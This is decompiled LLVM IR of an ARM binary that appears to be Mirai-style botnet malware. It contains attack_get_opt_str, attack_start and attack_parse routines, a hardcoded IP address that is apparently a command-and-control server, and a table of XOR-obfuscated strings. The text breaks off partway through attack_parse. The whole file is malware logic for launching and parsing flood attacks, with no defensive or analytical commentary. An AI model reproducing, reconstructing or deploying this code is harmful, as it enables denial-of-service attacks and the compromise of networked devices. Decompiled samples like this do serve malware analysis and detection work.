source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%anon_struct_4 = type { i32, i32*, i8, i8 }
%anon_struct_13 = type { i32, i32*, i8, i8 }
%anon_struct_13.3 = type { i32, i32*, i8, i8 }
%vfp_regs = type { [16 x i64], i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_219dc.22 = global i32 0
@global_var_d930.26 = constant i32 -382906384
@global_var_21c00.31 = global i32 0
@global_var_831c.32 = constant i32 -352321547
@global_var_12d7c.33 = constant i32 -382909968
@global_var_bd94.39 = constant i32 -382906384
@global_var_c1cc.41 = constant i32 -382906384
@global_var_b608.43 = constant i32 -382906384
@global_var_af5c.45 = constant i32 -382906384
@global_var_a864.47 = constant i32 -382906384
@global_var_a0b0.49 = constant i32 -382906384
@global_var_9040.52 = constant i32 -382906384
@global_var_89ac.54 = constant i32 -382906384
@global_var_965c.56 = constant i32 -382906384
@global_var_2471c.58 = global i32 0
@global_var_24724.70 = global i32 0
@global_var_19268.72 = constant i32 47
@global_var_c707.74 = constant [3 x i8] c"\0AH\00"
@global_var_21c04.76 = global i32 0
@global_var_24720.78 = global i32 0
@global_var_10c60.80 = constant i32 -382910336
@global_var_d7f8.82 = constant i32 -382910448
@global_var_21a90.84 = global i32 67096
@global_var_21a88.86 = global i32 -1
@global_var_1926c.91 = constant [15 x i8] c"212.237.54.173\00"
@global_var_2472c.94 = local_unnamed_addr global i32 0
@global_var_2472a.95 = local_unnamed_addr global i32 0
@global_var_21c08.97 = global i32 0
@global_var_1927c.105 = constant i32 10
@global_var_21a8c.107 = global i32 -1
@global_var_14250.112 = constant i32 -450904024
@global_var_10618.113 = constant i32 -382910352
@global_var_e0f4.116 = constant i32 103040
@global_var_19280.117 = constant i32 16777216
@global_var_21c10.119 = global i32 0
@global_var_21c1c.121 = global i32 0
@global_var_21c14.123 = global i32 0
@global_var_21c18.125 = global i32 0
@global_var_21c54.139 = global i32 0
@global_var_21c20.141 = global i32 0
@global_var_21c4c.143 = global i32 0
@global_var_24740.147 = global i32 0
@global_var_24738.151 = global i32 0
@global_var_2473c.153 = global i32 0
@global_var_21c26.156 = local_unnamed_addr global i32 0
@global_var_21c28.160 = local_unnamed_addr global i32 0
@global_var_21c2c.161 = local_unnamed_addr global i32 0
@global_var_21c2d.162 = local_unnamed_addr global i32 0
@global_var_21c46.165 = local_unnamed_addr global i32 0
@global_var_1928c.167 = constant i32 0
@global_var_19288.169 = constant [5 x i8] c"&;; \00"
@global_var_19290.171 = constant [5 x i8] c"5:?;\00"
@global_var_19298.173 = constant [9 x i8] c"<!: acam\00"
@global_var_192a4.175 = constant [7 x i8] c" 18:1 \00"
@global_var_192ac.177 = constant [8 x i8] c"0125!8 \00"
@global_var_192b4.179 = constant [9 x i8] c"$5''#;&0\00"
@global_var_192c0.181 = constant [6 x i8] c"509=:\00"
@global_var_192c8.183 = constant [6 x i8] c"\22=.,\22\00"
@global_var_192d0.185 = constant [8 x i8] c"'!$$;& \00"
@global_var_192d8.187 = constant i32 423502179
@global_var_192e8.189 = constant [6 x i8] c"efg`a\00"
@global_var_192f0.191 = constant [5 x i8] c"!'1&\00"
@global_var_192f8.193 = constant i32 943467547
@global_var_19304.195 = constant i32 322070023
@global_var_21c30.196 = local_unnamed_addr global i32 0
@global_var_21c2e.197 = local_unnamed_addr global i32 0
@global_var_21c34.198 = local_unnamed_addr global i32 0
@global_var_21c3c.200 = local_unnamed_addr global i32 0
@global_var_21c48.201 = local_unnamed_addr global i32 0
@global_var_e368.203 = constant i32 -382910352
@global_var_19310.205 = constant [3 x i8] c"\0D\0A\00"
@global_var_1931c.207 = constant i32 2096127
@global_var_19313.209 = constant i32 2095871
@global_var_24748.215 = global i32 0
@global_var_21a98.218 = global i32 -555811921
@global_var_19320.223 = constant [3 x i8] c"Qm\00"
@global_var_24750.224 = local_unnamed_addr global i32 0
@global_var_24754.225 = local_unnamed_addr global i32 0
@global_var_19324.227 = constant [14 x i8] c"0;'9-=$z78!6T\00"
@global_var_24758.228 = local_unnamed_addr global i32 0
@global_var_2475c.229 = local_unnamed_addr global i32 0
@global_var_24760.230 = local_unnamed_addr global i32 0
@global_var_24764.231 = local_unnamed_addr global i32 0
@global_var_19334.233 = constant i32 59987
@global_var_24768.234 = local_unnamed_addr global i32 0
@global_var_2476c.235 = local_unnamed_addr global i32 0
@global_var_194b4.237 = constant i32 808465680
@global_var_24774.238 = local_unnamed_addr global i32 0
@global_var_24770.239 = local_unnamed_addr global i32 0
@global_var_19338.241 = constant [7 x i8] c"'<188T\00"
@global_var_24778.242 = local_unnamed_addr global i32 0
@global_var_2477c.243 = local_unnamed_addr global i32 0
@global_var_19340.245 = constant [8 x i8] c"1:5681T\00"
@global_var_24780.246 = local_unnamed_addr global i32 0
@global_var_24784.247 = local_unnamed_addr global i32 0
@global_var_19348.249 = constant [8 x i8] c"'-' 19T\00"
@global_var_24788.250 = local_unnamed_addr global i32 0
@global_var_2478c.251 = local_unnamed_addr global i32 0
@global_var_19350.253 = constant [4 x i8] c"'<T\00"
@global_var_24794.254 = local_unnamed_addr global i32 0
@global_var_24790.255 = local_unnamed_addr global i32 0
@global_var_19354.257 = constant i32 977090171
@global_var_2479c.258 = local_unnamed_addr global i32 0
@global_var_24798.259 = local_unnamed_addr global i32 0
@global_var_19368.261 = constant i32 470227742
@global_var_247a4.262 = local_unnamed_addr global i32 0
@global_var_247a0.263 = local_unnamed_addr global i32 0
@global_var_19384.265 = constant [10 x i8] c":7;&&17 T\00"
@global_var_247ac.266 = local_unnamed_addr global i32 0
@global_var_247a8.267 = local_unnamed_addr global i32 0
@global_var_19390.269 = constant [17 x i8] c"{6=:{6!'-6;,t$'T\00"
@global_var_247b0.270 = local_unnamed_addr global i32 0
@global_var_247b4.271 = local_unnamed_addr global i32 0
@global_var_193a4.273 = constant [23 x i8] c"{6=:{6!'-6;,t?=88tymtT\00"
@global_var_247bc.274 = local_unnamed_addr global i32 0
@global_var_247b8.275 = local_unnamed_addr global i32 0
@global_var_10310.276 = constant i32 103356
@global_var_193bc.277 = constant [8 x i8] c"{$&;7{T\00"
@global_var_247c0.278 = local_unnamed_addr global i32 0
@global_var_247c4.279 = local_unnamed_addr global i32 0
@global_var_193c4.281 = constant [6 x i8] c"{1,1T\00"
@global_var_247c8.282 = local_unnamed_addr global i32 0
@global_var_247cc.283 = local_unnamed_addr global i32 0
@global_var_193cc.285 = constant [5 x i8] c"{20T\00"
@global_var_247d4.286 = local_unnamed_addr global i32 0
@global_var_247d0.287 = local_unnamed_addr global i32 0
@global_var_193d4.289 = constant [7 x i8] c"{95$'T\00"
@global_var_247d8.290 = local_unnamed_addr global i32 0
@global_var_247dc.291 = local_unnamed_addr global i32 0
@global_var_193dc.293 = constant [15 x i8] c"{$&;7{:1 { 7$T\00"
@global_var_247e0.294 = local_unnamed_addr global i32 0
@global_var_247e4.295 = local_unnamed_addr global i32 0
@global_var_193ec.297 = constant [9 x i8] c"{' 5 !'T\00"
@global_var_24848.298 = local_unnamed_addr global i32 0
@global_var_193f8.300 = constant [8 x i8] c"z5:=91T\00"
@global_var_24850.301 = local_unnamed_addr global i32 0
@global_var_19400.303 = constant [17 x i8] c"{$&;7{:1 {&;! 1T\00"
@global_var_247e8.304 = local_unnamed_addr global i32 0
@global_var_247ec.305 = local_unnamed_addr global i32 0
@global_var_19414.307 = constant [24 x i8] c"3e567`09;ga<:$f8=1d?>2T\00"
@global_var_247f0.308 = local_unnamed_addr global i32 0
@global_var_247f4.309 = local_unnamed_addr global i32 0
@global_var_1942c.311 = constant [9 x i8] c"5''#;&0T\00"
@global_var_247f8.312 = local_unnamed_addr global i32 0
@global_var_247fc.313 = local_unnamed_addr global i32 0
@global_var_194d4.315 = constant i32 557516544
@global_var_24804.316 = local_unnamed_addr global i32 0
@global_var_24800.317 = local_unnamed_addr global i32 0
@global_var_19438.319 = constant [18 x i8] c"{1 7{&1';8\22z7;:2T\00"
@global_var_2480c.320 = local_unnamed_addr global i32 0
@global_var_24808.321 = local_unnamed_addr global i32 0
@global_var_1944c.323 = constant [13 x i8] c":591'1&\221&tT\00"
@global_var_24814.324 = local_unnamed_addr global i32 0
@global_var_24810.325 = local_unnamed_addr global i32 0
@global_var_1945c.327 = constant [15 x i8] c"{01\22{#5 7<0;3T\00"
@global_var_24818.328 = local_unnamed_addr global i32 0
@global_var_2481c.329 = local_unnamed_addr global i32 0
@global_var_1946c.331 = constant [20 x i8] c"{01\22{9='7{#5 7<0;3T\00"
@global_var_24824.332 = local_unnamed_addr global i32 0
@global_var_24820.333 = local_unnamed_addr global i32 0
@global_var_19480.335 = constant [9 x i8] c"$662*7!E\00"
@global_var_24828.336 = local_unnamed_addr global i32 0
@global_var_2482c.337 = local_unnamed_addr global i32 0
@global_var_1948c.339 = constant [6 x i8] c";3=:T\00"
@global_var_24830.340 = local_unnamed_addr global i32 0
@global_var_24834.341 = local_unnamed_addr global i32 0
@global_var_10354.342 = constant i32 103572
@global_var_19494.343 = constant [7 x i8] c"1: 1&T\00"
@global_var_24838.344 = local_unnamed_addr global i32 0
@global_var_2483c.345 = local_unnamed_addr global i32 0
@global_var_1949c.347 = constant [24 x i8] c"e365`70;9ag:<$ef1=d?2>T\00"
@global_var_24844.348 = local_unnamed_addr global i32 0
@global_var_24840.349 = local_unnamed_addr global i32 0
@global_var_219e0.355 = global i32 0
@global_var_10fb8.378 = constant i32 -443088884
@global_var_1144c.394 = constant i32 -456978431
@global_var_10498.401 = constant i32 324206624
@global_var_11d3c.439 = constant i32 -478871519
@global_var_f3dc.446 = constant i32 -481099741
@global_var_127e0.457 = constant i32 -478805983
@global_var_f240.459 = constant i32 -481099739
@global_var_12bc8.468 = constant i32 -382906384
@global_var_14cd0.477 = constant i32 -442544040
@global_var_13560.500 = constant i32 -369098502
@global_var_13f34.514 = constant i32 -382910288
@global_var_140e4.526 = constant i32 -2020859901
@global_var_141d0.529 = constant i32 -494075872
@global_var_10e24.530 = constant i32 -382910336
@global_var_24be0.533 = local_unnamed_addr global i32 0
@global_var_12ff8.546 = constant i32 -442543860
@global_var_113b0.554 = constant i32 -369093146
@global_var_cd7c.578 = constant i32 436207673
@global_var_151c8.582 = constant i32 -382910352
@global_var_cb08.588 = constant i32 324206624
@global_var_165d8.604 = constant i32 -382906384
@global_var_16098.632 = constant i32 -382910448
@global_var_17a88.633 = constant i32 -382909968
@global_var_181c4.695 = constant i32 -481296376
@global_var_182bc.696 = constant i32 -481296376
@global_var_18340.697 = constant i32 -369098732
@global_var_21be0.12 = external global i8*
@global_var_21bfc.29 = external global i8*
@global_var_21bfd.37 = global i8 0
@1 = internal constant [2 x i8] c"\01\00"
@global_var_21a94.88 = global i8* getelementptr inbounds ([2 x i8], [2 x i8]* @1, i32 0, i32 0)
@global_var_24728.93 = global i16* null
@global_var_21c0c.110 = external global i8*
@global_var_21c50.145 = global i16* null
@global_var_21c24.155 = external global i8*
@global_var_21c38.158 = global i16 0
@global_var_21c44.159 = local_unnamed_addr global i8 0
@global_var_21c3a.163 = local_unnamed_addr global i16 0
@global_var_21c45.164 = local_unnamed_addr global i8 0
@global_var_21a38.351 = local_unnamed_addr global i16 8

declare void @__pseudo_branch(i32) local_unnamed_addr

declare void @__pseudo_cond_branch(i1, i32) local_unnamed_addr

define i32 @_init() local_unnamed_addr {
entry:
  %v3_80d8 = load i32, i32* @r4, align 4
  call void @__pseudo_branch(i32 %v3_80d8)
  %v31_80e0 = load i32, i32* @r0, align 4
  ret i32 %v31_80e0
}

define i32 @__do_global_dtors_aux() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_80f0 = load i32, i32* @r4, align 4
  store i32 %v3_80f0, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i8** @global_var_21be0.12 to i32), i32* %r4.global-to-local, align 4
  %v2_80f8 = load i8, i8* bitcast (i8** @global_var_21be0.12 to i8*), align 4
  %v2_80fc = icmp eq i8 %v2_80f8, 0
  br i1 %v2_80fc, label %dec_label_pc_8104, label %dec_label_pc_8120

dec_label_pc_8104:                                ; preds = %entry
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_811c = load i32, i32* %r4.global-to-local, align 4
  %v3_811c = inttoptr i32 %v2_811c to i8*
  store i8 1, i8* %v3_811c, align 1
  %v2_8120.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8120

dec_label_pc_8120:                                ; preds = %entry, %dec_label_pc_8104
  %v2_8120 = phi i32 [ %v3_80f0, %entry ], [ %v2_8120.pre, %dec_label_pc_8104 ]
  store i32 %v2_8120, i32* %r4.global-to-local, align 4
  ret i32 undef

; uselistorder directives
  uselistorder i8** @global_var_21be0.12, { 1, 0 }
  uselistorder label %dec_label_pc_8120, { 1, 0 }
}

define i32 @frame_dummy() local_unnamed_addr {
bb:
  call void @__pseudo_cond_branch(i1 false, i32 0)
  %v2_8158 = load i32, i32* @global_var_219dc.22, align 4
  %v2_815c = icmp eq i32 %v2_8158, 0
  br i1 %v2_815c, label %dec_label_pc_8174, label %dec_label_pc_8164

dec_label_pc_8164:                                ; preds = %bb
  call void @__pseudo_cond_branch(i1 false, i32 0)
  br label %dec_label_pc_8174

dec_label_pc_8174:                                ; preds = %bb, %dec_label_pc_8164
  ret i32 ptrtoint (i32* @global_var_219dc.22 to i32)

; uselistorder directives
  uselistorder i32* @global_var_219dc.22, { 1, 0 }
  uselistorder label %dec_label_pc_8174, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_start(i32 %arg1, i32 %arg2) local_unnamed_addr #0 {
entry:
  %stack_var_4 = alloca i32, align 4
  %v4_819c = ptrtoint i32* %stack_var_4 to i32
  %v8_81bc = call i32 @__uClibc_main(i32 ptrtoint (i32* @global_var_d930.26 to i32), i32 %arg2, i32* nonnull %stack_var_4, i32 32980, i32 103000, i32 %arg1, i32 %v4_819c)
  %v0_81c0 = call i32 @abort()
  ret i32 %v0_81c0
}

define i32 @attack_get_opt_str(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_81d0 = icmp eq i32 %arg1, 0
  br i1 %v2_81d0, label %dec_label_pc_8218, label %dec_label_pc_81e0

dec_label_pc_81e0:                                ; preds = %entry
  %v0_81e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_81e0 = add i32 %v0_81e0, 4
  %v2_81e0 = inttoptr i32 %v1_81e0 to i8*
  %v3_81e0 = load i8, i8* %v2_81e0, align 1
  %v4_81e0 = zext i8 %v3_81e0 to i32
  %v9_81e4 = icmp eq i32 %v4_81e0, %arg3
  br i1 %v9_81e4, label %dec_label_pc_8224, label %dec_label_pc_8208.preheader

dec_label_pc_8208.preheader:                      ; preds = %dec_label_pc_81e0
  br label %dec_label_pc_8208

dec_label_pc_81f8:                                ; preds = %dec_label_pc_8208
  %v1_81f8 = add i32 %v0_8200.in, 12
  %v2_81f8 = inttoptr i32 %v1_81f8 to i8*
  %v3_81f8 = load i8, i8* %v2_81f8, align 1
  %v4_81f8 = zext i8 %v3_81f8 to i32
  %v9_81fc = icmp eq i32 %v4_81f8, %arg3
  br i1 %v9_81fc, label %dec_label_pc_8224, label %dec_label_pc_8208

dec_label_pc_8208:                                ; preds = %dec_label_pc_8208.preheader, %dec_label_pc_81f8
  %v0_8200.in = phi i32 [ %v0_81e0, %dec_label_pc_8208.preheader ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v0_8208 = phi i32 [ 0, %dec_label_pc_8208.preheader ], [ %v1_8208, %dec_label_pc_81f8 ]
  %v0_8200 = add i32 %v0_8200.in, 8
  %v1_8208 = add i32 %v0_8208, 1
  %v9_820c = icmp eq i32 %v1_8208, %arg1
  store i32 %v0_8200, i32* %r1.global-to-local, align 4
  br i1 %v9_820c, label %dec_label_pc_8218, label %dec_label_pc_81f8

dec_label_pc_8218:                                ; preds = %dec_label_pc_8208, %entry, %dec_label_pc_8224
  %v0_8218 = phi i32 [ %arg4, %entry ], [ %v2_8224, %dec_label_pc_8224 ], [ %arg4, %dec_label_pc_8208 ]
  ret i32 %v0_8218

dec_label_pc_8224:                                ; preds = %dec_label_pc_81f8, %dec_label_pc_81e0
  %v0_8224 = phi i32 [ %v0_81e0, %dec_label_pc_81e0 ], [ %v0_8200, %dec_label_pc_81f8 ]
  %v1_8224 = inttoptr i32 %v0_8224 to i32*
  %v2_8224 = load i32, i32* %v1_8224, align 4
  br label %dec_label_pc_8218

; uselistorder directives
  uselistorder i32 %v1_8208, { 1, 0 }
  uselistorder i32 %v0_8200, { 1, 0, 2 }
  uselistorder i32 %v0_8200.in, { 1, 0 }
  uselistorder i32 %v0_81e0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8218, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8208, { 1, 0 }
}

define i32 @attack_start(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_822c = load i32, i32* @r4, align 4
  store i32 %v3_822c, i32* %stack_var_-32, align 4
  %v6_822c = load i32, i32* @r5, align 4
  %v9_822c = load i32, i32* @r6, align 4
  %v12_822c = load i32, i32* @r7, align 4
  %v0_8230 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_8230, i32* @sb, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %arg3, i32* @sl, align 4
  %v4_8240 = sext i8 %arg5 to i32
  store i32 %v4_8240, i32* @r8, align 4
  %v0_8244 = call i32 @__libc_fork()
  %v7_8248 = icmp eq i32 %v0_8244, -1
  %. = zext i1 %v7_8248 to i32
  store i32 %., i32* %r3.global-to-local, align 4
  %tmp23 = icmp slt i32 %v0_8244, 1
  br i1 %tmp23, label %bb24, label %.thread2

.thread2:                                         ; preds = %entry
  br label %dec_label_pc_8268

bb24:                                             ; preds = %entry
  store i32 %., i32* @r5, align 4
  %v2_8260 = icmp eq i1 %v7_8248, false
  br i1 %v2_8260, label %dec_label_pc_8270, label %dec_label_pc_8268

dec_label_pc_8268:                                ; preds = %.thread2, %bb24
  %v2_8268 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_8268, i32* @r4, align 4
  store i32 %v6_822c, i32* @r5, align 4
  store i32 %v9_822c, i32* @r6, align 4
  store i32 %v12_822c, i32* @r7, align 4
  ret i32 %v0_8244

dec_label_pc_8270:                                ; preds = %bb24
  %v0_8270 = call i32 @__libc_fork()
  %v7_8274 = icmp eq i32 %v0_8270, -1
  store i32 %v0_8270, i32* @r4, align 4
  br i1 %v7_8274, label %dec_label_pc_82a4, label %dec_label_pc_8280

dec_label_pc_8280:                                ; preds = %dec_label_pc_8270
  %v2_8280 = icmp eq i32 %v0_8270, 0
  br i1 %v2_8280, label %dec_label_pc_8288, label %dec_label_pc_82ac

dec_label_pc_8288:                                ; preds = %dec_label_pc_8280
  %v0_8288 = load i32, i32* @r6, align 4
  %v1_828c = call i32 @sleep(i32 %v0_8288)
  store i32 %v1_828c, i32* @r0, align 4
  %v0_8290 = call i32 @getppid()
  %v2_8298 = call i32 @kill(i32 %v0_8290, i32 9)
  %v0_829c = load i32, i32* @r4, align 4
  %v1_82a0 = call i32 @__GI_exit(i32 %v0_829c)
  br label %dec_label_pc_82a4

dec_label_pc_82a4:                                ; preds = %dec_label_pc_8270, %dec_label_pc_8288
  %v0_82a4 = load i32, i32* @r5, align 4
  %v1_82a8 = call i32 @__GI_exit(i32 %v0_82a4)
  br label %dec_label_pc_82ac

dec_label_pc_82ac:                                ; preds = %dec_label_pc_8280, %dec_label_pc_82a4
  store i32 ptrtoint (i8** @global_var_21bfc.29 to i32), i32* %r3.global-to-local, align 4
  %v2_82b0 = load i8, i8* bitcast (i8** @global_var_21bfc.29 to i8*), align 4
  %v3_82b0 = zext i8 %v2_82b0 to i32
  %v2_82b4 = icmp eq i8 %v2_82b0, 0
  br i1 %v2_82b4, label %dec_label_pc_82f8, label %dec_label_pc_82bc

dec_label_pc_82bc:                                ; preds = %dec_label_pc_82ac
  store i32 ptrtoint (i32* @global_var_21c00.31 to i32), i32* %r3.global-to-local, align 4
  %v2_82c0 = load i32, i32* @global_var_21c00.31, align 4
  %v1_82c4 = inttoptr i32 %v2_82c0 to i32*
  %v2_82c4 = load i32, i32* %v1_82c4, align 4
  %v1_82c8 = add i32 %v2_82c4, 4
  %v2_82c8 = inttoptr i32 %v1_82c8 to i8*
  %v3_82c8 = load i8, i8* %v2_82c8, align 1
  %v4_82c8 = zext i8 %v3_82c8 to i32
  store i32 %v4_82c8, i32* %r3.global-to-local, align 4
  %v1_82cc = load i32, i32* @r7, align 4
  %v9_82cc = icmp eq i32 %v4_82c8, %v1_82cc
  br i1 %v9_82cc, label %dec_label_pc_8300, label %dec_label_pc_82ec.preheader

dec_label_pc_82ec.preheader:                      ; preds = %dec_label_pc_82bc
  %v1_82d0 = load i32, i32* @r5, align 4
  br label %dec_label_pc_82ec

dec_label_pc_82dc:                                ; preds = %dec_label_pc_82ec
  %v4_82dc = mul i32 %v1_82ec, 4
  %v5_82dc = add i32 %v4_82dc, %v2_82c0
  %v6_82dc = inttoptr i32 %v5_82dc to i32*
  %v7_82dc = load i32, i32* %v6_82dc, align 4
  %v1_82e0 = add i32 %v7_82dc, 4
  %v2_82e0 = inttoptr i32 %v1_82e0 to i8*
  %v3_82e0 = load i8, i8* %v2_82e0, align 1
  %v4_82e0 = zext i8 %v3_82e0 to i32
  store i32 %v4_82e0, i32* %r3.global-to-local, align 4
  %v9_82e4 = icmp eq i32 %v4_82e0, %v1_82cc
  br i1 %v9_82e4, label %dec_label_pc_8300, label %dec_label_pc_82ec

dec_label_pc_82ec:                                ; preds = %dec_label_pc_82ec.preheader, %dec_label_pc_82dc
  %v0_82ec = phi i32 [ %v1_82d0, %dec_label_pc_82ec.preheader ], [ %v1_82ec, %dec_label_pc_82dc ]
  %v1_82ec = add i32 %v0_82ec, 1
  %v9_82f0 = icmp eq i32 %v1_82ec, %v3_82b0
  br i1 %v9_82f0, label %dec_label_pc_82f8, label %dec_label_pc_82dc

dec_label_pc_82f8:                                ; preds = %dec_label_pc_82ec, %dec_label_pc_82ac, %dec_label_pc_8300
  %v1_82fc = call i32 @__GI_exit(i32 0)
  %v0_8310.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_8300

dec_label_pc_8300:                                ; preds = %dec_label_pc_82dc, %dec_label_pc_82bc, %dec_label_pc_82f8
  %v0_8310 = phi i32 [ %v2_82c4, %dec_label_pc_82bc ], [ %v0_8310.pre, %dec_label_pc_82f8 ], [ %v7_82dc, %dec_label_pc_82dc ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  %v1_8310 = inttoptr i32 %v0_8310 to i32*
  %v2_8310 = load i32, i32* %v1_8310, align 4
  call void @__pseudo_branch(i32 %v2_8310)
  br label %dec_label_pc_82f8

; uselistorder directives
  uselistorder i32 %v1_82ec, { 2, 0, 1 }
  uselistorder i32 %v0_8270, { 1, 2, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i1 %v7_8248, { 1, 0 }
  uselistorder i32 %v0_8244, { 2, 1, 0 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 2, 0, 1 }
  uselistorder label %dec_label_pc_8300, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82f8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_82ec, { 1, 0 }
  uselistorder label %dec_label_pc_82ac, { 1, 0 }
  uselistorder label %dec_label_pc_82a4, { 1, 0 }
  uselistorder label %dec_label_pc_8268, { 1, 0 }
}

define i32 @attack_parse(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v6_8328 = load i32, i32* @r5, align 4
  %v9_8328 = load i32, i32* @r6, align 4
  %v12_8328 = load i32, i32* @r7, align 4
  %v18_8328 = load i32, i32* @sb, align 4
  %v21_8328 = load i32, i32* @sl, align 4
  %v24_8328 = load i32, i32* @fp, align 4
  %v2_832c = icmp ugt i32 %arg2, 2
  %v7_832c = icmp eq i32 %arg2, 3
  store i1 %v7_832c, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_8338 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_8338, i32* @r5, align 4
  %v2_833c = xor i1 %v7_832c, true
  %v3_833c = and i1 %v2_832c, %v2_833c
  br i1 %v3_833c, label %dec_label_pc_834c, label %dec_label_pc_8340

dec_label_pc_8340:                                ; preds = %dec_label_pc_838c, %.dec_label_pc_8340_crit_edge, %dec_label_pc_8380, %dec_label_pc_8370, %dec_label_pc_834c, %entry, %dec_label_pc_8538
  %v1_8348 = phi i32 [ %v1_8348.pre, %.dec_label_pc_8340_crit_edge ], [ %v1_8350, %dec_label_pc_838c ], [ %v1_8350, %dec_label_pc_8380 ], [ %v1_8350, %dec_label_pc_8370 ], [ %v1_8350, %dec_label_pc_834c ], [ %v0_8338, %entry ], [ %v0_853c, %dec_label_pc_8538 ]
  store i32 %v6_8328, i32* @r5, align 4
  store i32 %v9_8328, i32* @r6, align 4
  store i32 %v12_8328, i32* @r7, align 4
  store i32 %v18_8328, i32* @sb, align 4
  store i32 %v21_8328, i32* @sl, align 4
  store i32 %v24_8328, i32* @fp, align 4
  ret i32 %v1_8348

dec_label_pc_834c:                                ; preds = %entry
  %v1_834c = inttoptr i32 %v0_8338 to i32*
  %v2_834c = load i32, i32* %v1_834c, align 4
  store i32 %v2_834c, i32* %r1.global-to-local, align 4
  %v1_8350 = and i32 %v2_834c, 16711680
  store i32 %v1_8350, i32* %r0.global-to-local, align 4
  %v3_8354 = udiv i32 %v2_834c, 16777216
  %v4_8358 = udiv i32 %v1_8350, 256
  %v5_8358 = or i32 %v4_8358, %v3_8354
  %v1_835c = and i32 %v2_834c, 65280
  store i32 %v1_835c, i32* %r2.global-to-local, align 4
  %v4_8360 = mul nuw nsw i32 %v1_835c, 256
  %v5_8360 = or i32 %v5_8358, %v4_8360
  store i32 %v5_8360, i32* %r3.global-to-local, align 4
  %v7_8364 = icmp eq i32 %arg2, 4
  store i1 %v7_8364, i1* %cpsr_z.global-to-local, align 1
  %v5_8368 = call i32 @llvm.bswap.i32(i32 %v2_834c)
  store i32 %v5_8368, i32* @fp, align 4
  br i1 %v7_8364, label %dec_label_pc_8340, label %dec_label_pc_8370

dec_label_pc_8370:                                ; preds = %dec_label_pc_834c
  %v1_8370 = add i32 %v0_8338, 4
  %v2_8370 = inttoptr i32 %v1_8370 to i8*
  %v3_8370 = load i8, i8* %v2_8370, align 1
  %v4_8370 = zext i8 %v3_8370 to i32
  store i32 %v4_8370, i32* %r2.global-to-local, align 4
  %v7_8374 = icmp eq i32 %arg2, 5
  store i1 %v7_8374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_8374, label %dec_label_pc_8340, label %dec_label_pc_8380

dec_label_pc_8380:                                ; preds = %dec_label_pc_8370
  %v1_8380 = add i32 %v0_8338, 5
  %v2_8380 = inttoptr i32 %v1_8380 to i8*
  %v3_8380 = load i8, i8* %v2_8380, align 1
  %v4_8380 = zext i8 %v3_8380 to i32
  store i32 %v4_8380, i32* @sb, align 4
  %v2_8384 = icmp eq i8 %v3_8380, 0
  store i1 %v2_8384, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8384, label %dec_label_pc_8340, label %dec_label_pc_838c

dec_label_pc_838c:                                ; preds = %dec_label_pc_8380
  %v2_8390 = mul nuw nsw i32 %v4_8380, 5
  store i32 %v2_8390, i32* @r7, align 4
  %v1_8394 = add i32 %arg2, -6
  store i32 %v1_8394, i32* %r3.global-to-local, align 4
  %v3_8398 = icmp ult i32 %v1_8394, %v2_8390
  %v9_8398 = icmp eq i32 %v1_8394, %v2_8390
  store i1 %v9_8398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8398, label %dec_label_pc_8340, label %dec_label_pc_83a0

dec_label_pc_83a0:                                ; preds = %dec_label_pc_838c
  store i32 %v4_8380, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_8394, i32* @r6, align 4
  %v2_83ac = call i32 @calloc(i32 %v4_8380, i32 24)
  store i32 %v2_83ac, i32* %ip.global-to-local, align 4
